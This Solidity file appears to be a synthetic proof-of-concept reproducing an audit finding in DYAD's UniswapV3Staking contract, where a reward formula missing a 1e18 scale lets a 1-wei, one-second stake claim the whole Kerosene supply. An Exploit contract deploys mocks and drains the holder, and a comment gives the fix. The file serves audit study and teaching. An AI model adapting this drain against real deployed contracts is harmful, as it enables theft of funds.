// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DYAD — claiming a 1-wei Uniswap stake drains the kerosene supply
    (Pashov, #41686, C-01).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: UniswapV3Staking._calculateRewards multiplies
    timeDiff * rewardsRate * liquidity * xp with no 1e18 scale.
    A note whose XP equals the 1_000_000_000e18 kerosene supply, staked
    with 1 wei of liquidity for 1 second at rewardsRate 1, is owed the
    entire supply. claimRewards transferFroms that amount out of the holder.

    The audited body of _calculateRewards and _claimRewards is preserved.
    Repo: DyadStablecoin/contracts @ 973cb961198890449e0a80b4be4065dccff0abc0
    src/staking/UniswapV3Staking.sol */

contract Kerosene {
    string public name = "Kerosene";
    string public symbol = "KEROSENE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Notes {
    mapping(uint256 => address) public ownerOf;

    function setOwner(uint256 id, address owner) external {
        ownerOf[id] = owner;
    }
}

contract DyadXP {
    mapping(uint256 => uint256) public xpOf;

    function setXp(uint256 noteId, uint256 xp) external {
        xpOf[noteId] = xp;
    }

    function balanceOfNote(uint256 noteId) external view returns (uint256) {
        return xpOf[noteId];
    }
}

contract Holder {
    function approve(Kerosene token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

contract UniswapV3Staking {
    struct StakeInfo {
        uint256 liquidity;
        uint256 lastRewardTime;
        uint256 tokenId;
        bool isStaked;
    }

    Kerosene public rewardsToken;
    DyadXP public dyadXP;
    Notes public dnft;
    uint256 public rewardsRate;
    address public rewardsTokenHolder;
    mapping(uint256 => StakeInfo) public stakes;

    constructor(Kerosene _token, DyadXP _xp, Notes _notes, address _holder) {
        rewardsToken = _token;
        dyadXP = _xp;
        dnft = _notes;
        rewardsTokenHolder = _holder;
        rewardsRate = 1;
    }

    /// Reduced stake writer. The audited stake() stores the same four fields.
    function openStake(uint256 noteId, uint256 liquidity, uint256 lastRewardTime) external {
        require(dnft.ownerOf(noteId) == msg.sender, "You are not the Note owner");
        require(!stakes[noteId].isStaked, "Note already used for staking");
        require(liquidity > 0, "No liquidity");
        stakes[noteId] = StakeInfo({
            liquidity: liquidity,
            lastRewardTime: lastRewardTime,
            tokenId: 1,
            isStaked: true
        });
    }

    function claimRewards(uint256 noteId, address recipient) external {
        StakeInfo storage stakeInfo = stakes[noteId];
        _claimRewards(noteId, stakeInfo, recipient);
    }

    function _claimRewards(uint256 noteId, StakeInfo storage stakeInfo, address recipient) internal {
        require(dnft.ownerOf(noteId) == msg.sender, "You are not the Note owner");
        require(stakeInfo.isStaked, "Note not staked");
        uint256 rewards = _calculateRewards(noteId, stakeInfo);
        stakeInfo.lastRewardTime = block.timestamp;

        if (rewards > 0) {
            rewardsToken.transferFrom(rewardsTokenHolder, recipient, rewards);
        }
    }

    function _calculateRewards(uint256 noteId, StakeInfo storage stakeInfo) internal view returns (uint256) {
        uint256 timeDiff = block.timestamp - stakeInfo.lastRewardTime;

        uint256 xp = dyadXP.balanceOfNote(noteId);

        // @> VULN: no 1e18 scale, so 1 second * rate 1 * 1 wei * note XP pays XP kerosene
        return timeDiff * rewardsRate * stakeInfo.liquidity * xp;
        // FIX: return timeDiff * rewardsRate * stakeInfo.liquidity * xp / 1e18;
    }

    function currentRewards(uint256 noteId) external view returns (uint256) {
        StakeInfo storage stakeInfo = stakes[noteId];
        return _calculateRewards(noteId, stakeInfo);
    }
}

contract Exploit {
    uint256 public constant SUPPLY = 1_000_000_000 ether;
    uint256 public constant NOTE = 1;

    Kerosene public kerosene; // nonce 1
    Notes public notes; // nonce 2
    DyadXP public xp; // nonce 3
    Holder public holder; // nonce 4
    UniswapV3Staking public staking; // nonce 5

    uint256 public profit;
    uint256 public preview;
    uint256 public holderLeft;

    constructor() {
        kerosene = new Kerosene();
        notes = new Notes();
        xp = new DyadXP();
        holder = new Holder();
        staking = new UniswapV3Staking(kerosene, xp, notes, address(holder));
        kerosene.mint(address(holder), SUPPLY);
        notes.setOwner(NOTE, address(this));
    }

    function run() external {
        xp.setXp(NOTE, SUPPLY);
        holder.approve(kerosene, address(staking), SUPPLY);
        uint256 stakedAt = block.timestamp - 1;
        staking.openStake(NOTE, 1, stakedAt);
        preview = staking.currentRewards(NOTE);
        require(preview == SUPPLY, "preview is not the supply");
        staking.claimRewards(NOTE, address(this));
        profit = kerosene.balanceOf(address(this));
        holderLeft = kerosene.balanceOf(address(holder));
        require(profit == SUPPLY, "supply not claimed");
        require(holderLeft == 0, "holder not drained");
        require(kerosene.totalSupply() == SUPPLY, "supply changed");
    }
}
